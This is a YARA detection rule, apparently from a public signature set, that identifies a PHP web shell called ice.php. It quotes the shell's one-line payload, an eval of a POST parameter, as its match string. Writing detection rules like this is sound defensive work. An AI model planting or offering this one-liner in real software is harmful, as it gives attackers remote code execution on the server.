rule Webshell_caidao_shell_ice_2_RID319F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ice.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:30:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
   condition: 
      all of them
}